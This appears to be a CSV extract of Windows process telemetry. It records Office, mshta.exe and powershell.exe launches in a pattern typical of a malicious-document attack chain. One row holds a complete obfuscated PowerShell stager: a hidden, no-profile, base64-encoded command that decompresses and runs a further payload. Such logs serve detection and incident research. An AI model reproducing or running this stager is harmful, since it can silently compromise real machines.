874e15e2-f127-83e8-9787-0867e917339b,{'subject': 'c:\\program files\\microsoft office\\office14\\excel.exe None'},643110
2e0add6c-480e-8249-bb03-cef711aee34a,{'subject': 'c:\\windows\\system32\\mshta.exe None'},644371
a1d10ff8-bf52-85ba-89e1-756ec9db7a86,{'subject': 'c:\\program files\\microsoft office\\office14\\winword.exe None'},644240
5785b732-d9a3-8a2e-ae22-4cd94fde22e9,{'subject': 'c:\\program files\\microsoft office\\office14\\winword.exe None'},644212
ffea7b2d-503c-8c50-8eb6-2baeaec2c90b,{'subject': 'c:\\program files\\microsoft office\\office14\\excel.exe None'},643096
e4c7e746-28f1-807a-8ef1-db12b1507040,{'subject': 'c:\\windows\\system32\\mshta.exe None'},646099
04b27c4f-3d96-840c-bd48-4fbd30692d96,{'subject': 'c:\\program files\\microsoft office\\office14\\winword.exe None'},646034
076fd925-af03-8d79-9c76-85f8d2f89f20,{'subject': 'c:\\program files\\microsoft office\\office14\\winword.exe None'},646018
6416e1a8-d269-81ae-890c-e2f1756e4252,{'subject': 'c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe None'},648373
1aa7b94f-c82b-8cc9-b8da-32e0393bb77d,{'subject': 'c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe None'},648336
0821d4c2-5413-8ecb-8284-7ff65262f0a7,"{'subject': 'c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"" -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnAH0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGkAcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQA7ACQAcwA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAUwB0AGEAcgB0AEkAbgBmAG8AOwAkAHMALgBGAGkAbABlAE4AYQBtAGUAPQAkAGIAOwAkAHMALgBBAHIAZwB1AG0AZQBuAHQAcwA9ACcALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAJgAoAFsAcwBjAHIAaQBwAHQAYgBsAG8AYwBrAF0AOgA6AGMAcgBlAGEAdABlACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAKAAoACcAJwBIADQAcwBJAEEARwBUADYAMQBtAEkAQwBBADcAVgBXAGIAVwAvAGEAUwBCAEQAKwBYAHEAbgAvAHcAYQBxAFEATQBDAHIAQgBOAGkARQBSAFIASwBwADAAewAwAH0AcgB5AG0AcwBYAG0AewAwAH0AcwBRAE0AVQBuAFQAYgAyAFkAagBhAHMAdgBjAFIAZQBRADAAaQB2AC8ALwAxAG0AQQBUAGUAcABrAHQAJwAnACsAJwAnADcAMQBUAHEAbwBsAHkAKwB2ACcAJwArACcAJwBkAG0AZABuAFoAWgA1ADYAWgAyAFcAVQBXACsANQB5AHcAVwBBAG8AZQBPAHQAZgBTADEALwBmAHYAcABOAE0AegBSAEEAbQBLAEoATABsAEEAawB5AEEATgB5AGwASgBoAGIAWABSAEsAegA2AHUARgBWAFYAWAA2AEoATQBsAHoAZgBiAE4AcABzAFEAaQBSAGUASABGADEAWgBXAFIASgBnAG0ATgArAC8ASwA5ADAATQBkAGYAVABGAEUAZAAzAGwATwBCAFUATABrAGwALwBTAGQANABLAEoALwBoAHMAYwBIAGUAUABmAFMANQA5AGwAUQBwAC8AVgByAHEAVQAzAFMARgA2AEUAdABzAGIAeQBGADkAaAA2AFUAeQBQACcAJwArACcAJwBBADcARgAyAHcAMwB3AGsASABLAHYAWQBHADAAcQA0AFgAUAB6AHkAcABWAGkAYQBuADIAbQBMAFMAdgBzAGgAUQB6AFMAVgBpAC8AWQArADUAVABpAHEAQgBKAFEAVwBTADkASwAzAGsAdABqAFEAMgBXACsAdwBYAEQAUwBKAG4ANwBDAFUATABYAG4ARgBJAC8ARgA1AHQAVABLAEoAVQA3AFQARQBGAGwAagBiAFkAaABQAHoARgBRAHYAUwBJAGgAegBsACsAVABBAEoANQBsAGsAUwBpAHoATQBKAEkAMABjAFIAdQBRAGoARABZAGMASgA4AFAAUQBnAFMAbgBLAGIARgBzAGoAUQBYADUAdQBlAEwAewAwAH0AUgAvAHkALwBMAFQAMwBPAEkAcwA1AGkAWABDAGwASAAzACcAJwArACcAJwBPAGMAcwBJADIATgBrAHkAMwB7ADAAfQBjAFYAcgBwAG8AVABpAGcAZQBJAHkAWABDADkAQwB5AGUAVQBMAGkAYwBGAEUAcQBnAGQAaQBXAHIAYgBGAGMAaQBEAE4ASwB5ADkASgAvAE0AUwBOAGIAZQBKAGMAagA5ADYAdABLADgAawBzAGwAawBCAHIAeQBwAEYAUwBHAGcATAA0ADYAcABjAG0AQwBqAE8ASwBqAFgAdgBFAE4ATgA0ADgAVQBLAE0ARgB6AG8AZwBHAEEAOQAwADMAZwB0ADgAeQA1AHcAJwAnACsAJwAnADgAZwBnAGYAWQBNADcAegB7ADAAfQBQADUATQB6ACsAcwBZAFAAQgBZAEgAcgBLAFUASABKAFEALwBTAFcAcABaAE0AbQBGADMAewAwAH0ARgBtAHkAaAA5ACsAQwBrADIAUwA0AHQAUABpAE8AdAAxAFQAWQB0AHMAcQAvAGEAawB2AEwARgBVAEUAdABHAHMARABFADMARwBVAGsAVwBEAHkAcgAvAHsAMAB9AEQANQBBAHIANgBJAGgATQB6AFAAYQBkAHoAQwBTAHsAMAB9AEwAagAxAGoANQBHAEUAZgBGAHoAcABzAHAAdgB7ADAAfQBRAE0AdgBLAFQANwBBAFUAYwBuAEYATABIAEIAUABMAHAANABXAGMATgBEAEMARgBJAGUASQBDADQAdwBGAEwAVgA2AHAAdABTAFAAQwB2ACsAcwAyAE0AMABJAEQAbgBPAGcAKwB7ADAAfQBEAFEARgByAHkARABjAHAAUgArAGQATwBZAFoATgBMAHYAWgBqAEUAMABlAEEAMwBQAEUAZgBlAEYAcABZAFEAbgA3AGcAWABQAHEAVQBFAC8AdAA4AGQALwBFAFAAUQBrAFcARABvAGoAUQB0AFMAOABNAE0ARQB0AFEAdgBTAHoAWgBHAEYARQBPAGUANgAzAEYASwBUAGsAdAA2AHsAMAB9AHQAbABoAFcASAB7ADAAfQAyADEAOAB3AG8ASgB6ADUASwBlAFcANQB1AFUAZgBvAFIAegBkAE8AdQBCAG8AdABUAG4AbQBRACsAaABCAFEAUQBjAE8AdwBOADkAZwBtAGkAQQBwAEMAeQAxAEMATQBCACcAJwArACcAJwBiAHUANQB0AEUAdQBhADcARgA5ACsARQB3ADAAQwBVAFEAdQBLAEEAcABTADIARQBBADIAWQBFAEQARABZAFgAUgBFAGwARQBRAGQAJwAnACsAJwAnAHEAMgBTAGgAVQBiADgAMwA2ADAAbwBUAGcAQwBpAFUATwAxADYARgBBAFUAUQBtADAANABKAGMAZQBCAFYAeQBqAEUAUQBmAEYAdABMAC8ATQBrAE8ARABKAGUAbwBKAEwARAA4AGMASgBIAEMATABWAE4ARwBTADkATABMAGsAawA0AGwAQgA2AEIAYwBEAFQANABIAHcANgA4AEwAagBqAEMARQB5AFAAQgBwADYAagBJAGUAVgA3AE4AbQAzAHMAdQBpAEYAOQBJAC8AZAAyAFQAbwBPAGMASgBuAEEATQBVAEMAUQBjAFkATwBnAG0ATABtAGkAagBGAGwANwBWAGoAZABaAEUALwBLAEEAJwAnACsAJwAnAE0AeQAxAE8ARwBaAHQAbgBvADIAdwBlADYAYQBhAFAAMABkAHYAQwBhADgARQAzAEwAZQBaACsAYQB5AFAAdQBRAHEAaQAwAHoAZgBTAEkAZgBkAFQAbAAwAG4AdQAzAEQAbgAxAHkAMwBkAEQANgA0AEQAMwBMAEQAZABHAHIAZgAnACcAKwAnACcAYgBmAFcANAAnACcAKwAnACcATQA5AGQANgBJAHEATQAzAGEAeQBtACsAJwAnACsAJwAnAHEAagBoAGgAcgBZAFQAagBSAGUAdwA1AFIAdwArAG4ASwBwACsAcQB3ADEAVgBQAHMAYQBhAHEAUwBYAGMAOABUAHQAbwA0ADIALwBGAHEAdABkADYAdgBxADUAKwBlADEAdwBiAG0ANgBCAHUAJwAnACsAJwAnAGkAbQBvAEwAZgBXAEEAeQBzAGkAdQA4AGMAYgBHAEUATQBaAEgAZAB3ADAAKwAyAGwAVAA3AGQAUAAyAHQAVABHACsAOAA2AHEAZABtAFUAZAA3AFMAcQAyAHoAVwBuAG8AcwB0AFMAKwBuAEwAVQBWAFIARwBnAEgAcQBYAHQAQgBBAGIANwBLAGcAUwBqAFAAawBqAHAAbgBUADgANgBPAG0AbwByAGgAbQB3AEoAMgBKAFoAagBtAFQAagB5AHQAYgBuAE4AUAB7ADAAfQBHAHAAZgBJAGUAMAB5AG4AZABsADIANwB1AGQAZgBEAHoAMgAxAHQATgBRACcAJwArACcAJwBXAGQAbwBOAHQANABRAHEAMAAwAHQATAAwAEwAZABlAGIAdABRAHMAZgByADMAUABmAGIARABhAGYAZgBDAFUAUABUADYAVwBmAG0AZgBSAHIANgA4AGYAUgB5ADQAUABpAFoAYQBhAHoARABjAGQAVwA5AFIAOQBYADYAMQByAHoAWABIADgAMgBXAGUATgB2AGgATwBLAEwANwBtAFQAZgBiAFkAcQBOACsAWQBlADEAcgBPADcAMABiAFgAcgBwAHsAMAB9AEYAQwBzAE4AMQA1AGwAVQBXAFEAdgA4AFkAQgAvADMANABNAFMAQQBhAE0ASwBYAEcAOAAwADEAUgB7ADAAfQBPAFQAegA3AHAAVABiAFYASQBOADIAbwA3AFcAcwBHADYAZgA2AEgANQBVAHIAZQAvAHUASgBtADEAdQByAFMAOABNAC8ANgBtADkAcwA5AHsAMAB9AFEATgBaADgAcwAxAHsAMAB9AG8AMQBSADYAaQBEAHIAKwBQADYAbgBhACcAJwArACcAJwBKAE4ANAArADYAawBHAHUAcABtAFIAdAByAGkAZgBLADUAbQBlACcAJwArACcAJwBXAGoAQQAzAFoAdgA3AHIAYQBMAE4AWgBnADgARwBiAGIAQwB3AFoAZQBwADYAUAB3ADUAUgBPAEIANgBoAFYAYwBOAEQAUABiAGMAYgBNADkAQgAxAEwAWQBHAEoAaAB3AHkAMQAyACsAJwAnACsAJwAnADIAQgAvAFAAUgBXAEQAOABaAGoAUgBwAG8AZwAzADEAMgAxADYANgAzAGIARQBIAHcAZQBCAHYANAA1AEcAKwAvAEEAMABlADUARwBSADcAbwArADAAZwBGAGYAZQBIAFcAOQBZAHoASAB2ADgAOQBpADUAVwBDAHIAdQAnACcAKwAnACcARwB2AFkAbQBPAEwAaQBGADkAUgBEAFcASABEAGMASwBnAGYAVQB7ADAAfQBVAFIAcABlAFoAOQBkAHoAaABtAFQAbgBOADMAYwAxAHMASQAvAGQANgBVADUAVABHAEkASgBvAEsAJwAnACsAJwAnAGQAWABHAFAAdQBoAGQAcQAxAFAANwBJAHAAdgAnACcAKwAnACcAZABqAHYAUgBNAE0AVABSAEcAWgB3ADkANgBaADYAaABvAG8AMAArAGYAUABnAEMAaAA1AHsAMAB9AE0AUwA4AC8AUABxAG8AcwBDAHMAdQBpAGoAMQA3ADkAOABWAE4AdQA0AEwAVAB2ACsAcwBqAFoAawBvAFMAVgBlAEkAQQB0AGUAaABRACsAWABGAHAAcwBPAFMAegBxAG4AbgBEAEIAawBSAEcAcgBKADgAdQBMAGUAcwBjAFIASgBqAEMAcgAwAGUAYgBnAE4ANQBuAHUAcQBVAE0AbAA5ADAAdgBFAE4AMwBnAG0ANQA3ADcASQBHAGkASgBVAC8ANgBCADUALwBlAEcAcABXAGsANwA0AEsAbAA1ADEANgBZAFQAMQAxAGQAegBjAEIATAB5AEgAMgBSAG0AWgBVAGIASABJAGQAOABWAFYAWQBmAHoAMQBVAFYAZQBwAGoANgBxAE4AWQBPAGEAZgA3AHIAWgB6AFAAWQBaAGkAOABmAGoASgBWAEYARgB3AFIAbwBjAHQAdgAwAFkAQgB2AE0AawBhACcAJwArACcAJwBVAGsAeQA3ADgAZgBMAGIAagBxAGMAQwBpADgAUAA4AGYAcgBaADkARABCADMAbQBzAG8AbABWAEMANABqAHoAVgBNAEEATgBoAGsAagBMADYARQA3ADMAQwB1ADcAMAB7ADAAfQA0AGkAUgAyAEEAcABzAEgAQgA1ACsASwBTAEkAeQBnAEMANgBtAGYANABRAFMAcAB3AGMAUQBWADQAZQBhAFUAbwA0AEcAMwA3ADkAOQBMAG0AVgBJAGgAWAA4AEEAbgArAGoAVABiAFAAYwAvACsAdwArAGsAdABVAFUAcwBzAEMAbgBGAGUAVABQADAANgA4ADYARgA2AC8ARQBRAEEAUABFAFEANgBTAE4AdgBRAFQAaQBvACsAWABtADcAZAB7ADAAfQBPAEcAWABLAGkALwBoAEMAYwBDAEEATgBsAHEAZABIAFgAUABZAEgAJwAnACsAJwAnAEcAVAArAHoANABBAEoANQBhAEcAbAAvAEEAMgBTAGUASwBZAEIAbABEAEEAQQBBACcAJwApAC0AZgAnACcAeAAnACcAKQApACkAKQAsAFsAUwB5AHMAdABlAG0ALgBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0AcAByAGUAcwBzACkAKQApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApACkAKQAnADsAJABzAC4AVQBzAGUAUwBoAGUAbABsAEUAeABlAGMAdQB0AGUAPQAkAGYAYQBsAHMAZQA7ACQAcwAuAFIAZQBkAGkAcgBlAGMAdABTAHQAYQBuAGQAYQByAGQATwB1AHQAcAB1AHQAPQAkAHQAcgB1AGUAOwAkAHMALgBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAPQAnAEgAaQBkAGQAZQBuACcAOwAkAHMALgBDAHIAZQBhAHQAZQBOAG8AVwBpAG4AZABvAHcAPQAkAHQAcgB1AGUAOwAkAHAAPQBbAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG8AYwBlAHMAcwBdADoAOgBTAHQAYQByAHQAKAAkAHMAKQA7AA=='}",648375
578109f8-a5c3-8ad5-9fb4-e1208209bfce,{'subject': 'c:\\windows\\system32\\mshta.exe C:\\Windows\\System32\\mshta.exe -Embedding'},648297
dd7302bd-e4d9-895b-9a65-c7957cc6c9be,{'subject': 'c:\\windows\\system32\\mshta.exe C:\\Windows\\System32\\mshta.exe -Embedding'},648338
1aa7b94f-c82b-8cc9-b8da-32e0393bb77d,{'subject': 'c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe None'},648336
